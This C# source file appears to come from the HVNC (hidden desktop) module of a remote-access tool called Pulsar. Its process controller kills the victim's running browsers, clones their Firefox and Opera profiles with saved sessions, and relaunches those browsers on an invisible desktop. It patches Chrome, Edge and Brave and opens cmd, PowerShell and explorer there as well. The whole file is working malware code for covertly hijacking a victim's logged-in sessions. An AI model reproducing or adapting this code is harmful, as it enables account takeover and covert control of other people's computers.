using Microsoft.Win32;
using Pulsar.Client.Helper;
using Pulsar.Client.Helper.HVNC.Chromium;
using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Pulsar.Client.Helper.HVNC
{
    public class ProcessController
    {
        public ProcessController(string DesktopName)
        {
            this.DesktopName = DesktopName;
        }

        [DllImport("kernel32.dll")]
    private static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, int dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, ref PROCESS_INFORMATION lpProcessInformation);

    [DllImport("user32.dll")]
    private static extern uint WaitForInputIdle(IntPtr hProcess, uint dwMilliseconds);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool CloseHandle(IntPtr hObject);

    private delegate bool EnumWindowsProc(IntPtr hWnd, IntPtr lParam);

    [DllImport("user32.dll")]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool EnumWindows(EnumWindowsProc lpEnumFunc, IntPtr lParam);

    [DllImport("user32.dll")]
    private static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);

    [DllImport("user32.dll")]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool GetWindowRect(IntPtr hWnd, out RECT lpRect);

    [DllImport("user32.dll")]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool IsWindowVisible(IntPtr hWnd);

    [DllImport("user32.dll")]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool SetWindowPos(IntPtr hWnd, IntPtr hWndInsertAfter, int X, int Y, int cx, int cy, uint uFlags);

    private const uint SWP_NOSIZE = 0x0001;
    private const uint SWP_NOZORDER = 0x0004;
    private const uint SWP_NOACTIVATE = 0x0010;

        private void CloneDirectory(string sourceDir, string destinationDir)
        {
            if (!Directory.Exists(sourceDir))
            {
                throw new DirectoryNotFoundException($"Source directory '{sourceDir}' not found.");
            }

            Directory.CreateDirectory(destinationDir);

            var directories = Directory.GetDirectories(sourceDir, "*", SearchOption.AllDirectories);
            var files = Directory.GetFiles(sourceDir, "*", SearchOption.AllDirectories);

            foreach (var dir in directories)
            {
                try
                {
                    string targetDir = dir.Replace(sourceDir, destinationDir);
                    Directory.CreateDirectory(targetDir);
                }
                catch (Exception) { }
            }

            foreach (var file in files)
            {
                try
                {
                    string targetFile = file.Replace(sourceDir, destinationDir);
                    File.Copy(file, targetFile, true);
                }
                catch (UnauthorizedAccessException) { }
                catch (IOException) { }
                catch (Exception) { }
            }
        }

        private static bool DeleteFolder(string folderPath)
        {
            bool result;
            try
            {
                if (Directory.Exists(folderPath))
                {
                    Directory.Delete(folderPath, true);
                    result = true;
                }
                else
                {
                    Debug.WriteLine("Folder does not exist.");
                    result = false;
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine("Error deleting folder: " + ex.Message);
                result = false;
            }
            return result;
        }

        public void StartCmd()
        {
            string path = "conhost cmd.exe";
            this.CreateProc(path);
        }

        public void StartPowershell()
        {
            string path = "conhost powershell.exe";
            this.CreateProc(path);
        }

        public void StartGeneric(string path)
        {
            string command = "conhost " + path;
            this.CreateProc(command);
        }

        public void StartFirefox()
        {
            try
            {
                string path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Mozilla\\Firefox\\";

                if (!Directory.Exists(path))
                {
                    return;
                }

                string sourceDir = Path.Combine(path, "Profiles");
                if (!Directory.Exists(sourceDir))
                {
                    return;
                }

                string text = Path.Combine(path, "fudasf");
                string filePath = "Conhost --headless cmd.exe /c taskkill /IM firefox.exe /F";
                if (!Directory.Exists(text))
                {
                    Directory.CreateDirectory(text);
                    this.CreateProc(filePath);
                    this.CloneDirectory(sourceDir, text);
                }
                else
                {
                    DeleteFolder(text);
                    this.StartFirefox();
                    return;
                }

                string filePath2 = "Conhost --headless cmd.exe /c start firefox --profile=\"" + text + "\"";
                this.CreateProc(filePath2);
            }
            catch (Exception ex)
            {
                Debug.WriteLine("Error starting Firefox: " + ex.Message);
            }
        }

        public void StartBrave()
        {
            try
            {
                string path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\BraveSoftware\\Brave-Browser\\User Data";

                if (!Directory.Exists(path))
                {
                    return;
                }

                string filePath = "Conhost --headless cmd.exe /c taskkill /IM brave.exe /F";
                this.CreateProc(filePath);

                PrinterPatcher patcher = new PrinterPatcher(Environment.GetEnvironmentVariable("PROGRAMFILES") + "\\BraveSoftware\\Brave-Browser\\Application\\brave.exe", Environment.GetEnvironmentVariable("PROGRAMFILES") + "\\BraveSoftware\\Brave-Browser\\Application", "\\BraveSoftware", "chrome.dll");
                patcher.Start();
            }
            catch (Exception ex)
            {
                Debug.WriteLine("Error starting Brave: " + ex.Message);
            }
        }

        public void StartOpera()
        {
            try
            {
                string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Opera\\";
                if (!Directory.Exists(path)) return;

                string sourceDir = path;
                string text = Path.Combine(Path.GetDirectoryName(path), "fudasf");
                string killCommand = "Conhost --headless cmd.exe /c taskkill /IM opera.exe /F";

                if (!Directory.Exists(text))
                {
                    Directory.CreateDirectory(text);
                    this.CreateProc(killCommand);
                    this.CloneDirectory(sourceDir, text);
                }
                else
                {
                    DeleteFolder(text);
                    this.StartOpera();
                    return;
                }

                string operaEXEPath = Environment.GetEnvironmentVariable("LOCALAPPDATA") + "\\Programs\\Opera\\opera.exe";

                string startCommand = "Conhost --headless cmd.exe /c start \"\" " + $"\"{operaEXEPath}\"" + " --user-data-dir=\"" + text + "\"";
                this.CreateProc(startCommand);

                // wait 2 seconds then patch (it's startup up anyway doesn't matter)
                Thread.Sleep(2000);
                Task.Run(async () =>
                {
                    await OperaPatcher.PatchOperaAsync(maxRetries: 5, delayBetweenRetries: 1000);
                });
            }
            catch (Exception ex)
            {
                Debug.WriteLine("Error starting Opera: " + ex.Message);
            }
        }
        
        public void StartOperaGX()
        {
            try
            {
                string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Opera Software\\Opera GX Stable\\";
                if (!Directory.Exists(path)) return;

                string sourceDir = path;
                string text = Path.Combine(Path.GetDirectoryName(path), "fudasf");
                string killCommand = "Conhost --headless cmd.exe /c taskkill /IM operagx.exe /F";

                if (!Directory.Exists(text))
                {
                    Directory.CreateDirectory(text);
                    this.CreateProc(killCommand);
                    this.CloneDirectory(sourceDir, text);
                }
                else
                {
                    DeleteFolder(text);
                    this.StartOperaGX();
                    return;
                }

                string operaGXEXEPath = Environment.GetEnvironmentVariable("LOCALAPPDATA") + "\\Programs\\Opera GX\\opera.exe";

                string startCommand = "Conhost --headless cmd.exe /c start \"\" " + $"\"{operaGXEXEPath}\"" + " --user-data-dir=\"" + text + "\"";
                Debug.WriteLine(startCommand);
                this.CreateProc(startCommand);

                Thread.Sleep(2000);
                Task.Run(async () =>
                {
                    await OperaPatcher.PatchOperaAsync(maxRetries: 5, delayBetweenRetries: 1000);
                });
            }
            catch (Exception ex)
            {
                Debug.WriteLine("Error starting OperaGX: " + ex.Message);
            }
        }

        public void StartEdge()
        {
            try
            {
                string path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Microsoft\\Edge\\";
                if (!Directory.Exists(path))
                {
                    return;
                }

                string filePath = "Conhost --headless cmd.exe /c taskkill /IM msedge.exe /F";
                this.CreateProc(filePath);

                // Use PROGRAMFILES for the default Edge install location
                string programFiles = Environment.GetEnvironmentVariable("PROGRAMFILES(X86)");
                string edgeExe = programFiles + "\\Microsoft\\Edge\\Application\\msedge.exe";
                string edgeAppDir = programFiles + "\\Microsoft\\Edge\\Application";

                PrinterPatcher patcher = new PrinterPatcher(edgeExe, edgeAppDir, "\\Microsoft\\Edge", "msedge.dll");
                patcher.Start();
            }
            catch (Exception ex)
            {
                Debug.WriteLine("Error starting Edge: " + ex.Message);
            }
        }

        public void Startchrome()
        {
            try
            {
                string path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome\\";

                if (!Directory.Exists(path))
                {
                    return;
                }

                //string sourceDir = Path.Combine(path, "User Data");
                //string text = Path.Combine(Environment.GetEnvironmentVariable("TEMP"), "\\FakeAppData");
                string filePath = "Conhost --headless cmd.exe /c taskkill /IM chrome.exe /F";
                this.CreateProc(filePath);
                //if (!Directory.Exists(text))
                //{
                //    Directory.CreateDirectory(text);
                //    this.CreateProc(filePath);
                //    this.CloneDirectory(sourceDir, text);
                //}
                //else
                //{
                //    DeleteFolder(text);
                //    this.Startchrome();
                //}

                PrinterPatcher patcher = new PrinterPatcher(Environment.GetEnvironmentVariable("PROGRAMFILES") + "\\Google\\Chrome\\Application\\chrome.exe", Environment.GetEnvironmentVariable("PROGRAMFILES") + "\\Google\\Chrome\\Application", "\\Google", "chrome.dll");
                patcher.Start();
            }
            catch (Exception ex)
            {
                Debug.WriteLine("Error starting Chrome: " + ex.Message);
                return;
            }
            return;
        }

        public void StartDiscord()
        {
            string discordPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Discord\\Update.exe";
            if (!File.Exists(discordPath)) return;

            string killCommand = "Conhost --headless cmd.exe /c taskkill /IM discord.exe /F";
            this.CreateProc(killCommand);
            Thread.Sleep(1000);
            string startCommand = "\"" + discordPath + "\" --processStart Discord.exe";
            this.CreateProc(startCommand);
        }

        public void StartExplorer()
        {
            uint num = 2U;
            string name = "TaskbarGlomLevel";
            string name2 = "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced";
            using (RegistryKey registryKey = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(name2, true))
            {
                if (registryKey != null)
                {
                    object value = registryKey.GetValue(name);
                    if (value is uint)
                    {
                        uint num2 = (uint)value;
                        if (num2 != num)
                        {
                            registryKey.SetValue(name, num, RegistryValueKind.DWord);
                        }
                    }
                }
            }
            string explorerPath = Environment.GetFolderPath(Environment.SpecialFolder.Windows) + "\\explorer.exe /NoUACCheck";
            this.CreateProc(explorerPath);
        }

        public bool CreateProc(string filePath)
        {
            STARTUPINFO structure = default(STARTUPINFO);
            structure.cb = Marshal.SizeOf<STARTUPINFO>(structure);
            structure.lpDesktop = this.DesktopName;
            PROCESS_INFORMATION process_INFORMATION = default(PROCESS_INFORMATION);
            bool created = CreateProcess(null, filePath, IntPtr.Zero, IntPtr.Zero, false, 48, IntPtr.Zero, null, ref structure, ref process_INFORMATION);

            if (created)
            {
                CenterProcessWindowAsync(process_INFORMATION);
            }
            else
            {
                if (process_INFORMATION.hProcess != IntPtr.Zero)
                {
                    CloseHandle(process_INFORMATION.hProcess);
                }

                if (process_INFORMATION.hThread != IntPtr.Zero)
                {
                    CloseHandle(process_INFORMATION.hThread);
                }
            }

            return created;
        }

        private string DesktopName;

        private void CenterProcessWindowAsync(PROCESS_INFORMATION processInfo)
        {
            Task.Run(() =>
            {
                try
                {
                    if (processInfo.hProcess == IntPtr.Zero)
                    {
                        return;
                    }

                    WaitForInputIdle(processInfo.hProcess, 5000);

                    IntPtr targetWindow = IntPtr.Zero;
                    for (int attempt = 0; attempt < 40 && targetWindow == IntPtr.Zero; attempt++)
                    {
                        targetWindow = FindWindowForProcess(processInfo.dwProcessId);
                        if (targetWindow == IntPtr.Zero)
                        {
                            Thread.Sleep(250);
                        }
                    }

                    if (targetWindow == IntPtr.Zero)
                    {
                        return;
                    }

                    if (!GetWindowRect(targetWindow, out RECT windowRect))
                    {
                        return;
                    }

                    int windowWidth = windowRect.Right - windowRect.Left;
                    int windowHeight = windowRect.Bottom - windowRect.Top;

                    var bounds = ScreenHelperCPU.GetBounds(0);
                    int centeredX = bounds.Left + Math.Max((bounds.Width - windowWidth) / 2, 0);
                    int centeredY = bounds.Top + Math.Max((bounds.Height - windowHeight) / 2, 0);

                    SetWindowPos(targetWindow, IntPtr.Zero, centeredX, centeredY, 0, 0, SWP_NOSIZE | SWP_NOZORDER | SWP_NOACTIVATE);
                }
                catch (Exception ex)
                {
                    Debug.WriteLine($"Failed to center HVNC process window: {ex.Message}");
                }
                finally
                {
                    if (processInfo.hThread != IntPtr.Zero)
                    {
                        CloseHandle(processInfo.hThread);
                    }

                    if (processInfo.hProcess != IntPtr.Zero)
                    {
                        CloseHandle(processInfo.hProcess);
                    }
                }
            });
        }

        private static IntPtr FindWindowForProcess(int processId)
        {
            IntPtr target = IntPtr.Zero;

            EnumWindows((hWnd, _) =>
            {
                if (!IsWindowVisible(hWnd))
                {
                    return true;
                }

                GetWindowThreadProcessId(hWnd, out uint windowProcessId);
                if (windowProcessId != (uint)processId)
                {
                    return true;
                }

                target = hWnd;
                return false;
            }, IntPtr.Zero);

            return target;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct RECT
        {
            public int Left;
            public int Top;
            public int Right;
            public int Bottom;
        }

        private struct STARTUPINFO
        {
            public int cb;

            public string lpReserved;

            public string lpDesktop;

            public string lpTitle;

            public int dwX;

            public int dwY;

            public int dwXSize;

            public int dwYSize;

            public int dwXCountChars;

            public int dwYCountChars;

            public int dwFillAttribute;

            public int dwFlags;

            public short wShowWindow;

            public short cbReserved2;

            public IntPtr lpReserved2;

            public IntPtr hStdInput;

            public IntPtr hStdOutput;

            public IntPtr hStdError;
        }

        internal struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;

            public IntPtr hThread;

            public int dwProcessId;

            public int dwThreadId;
        }
    }
}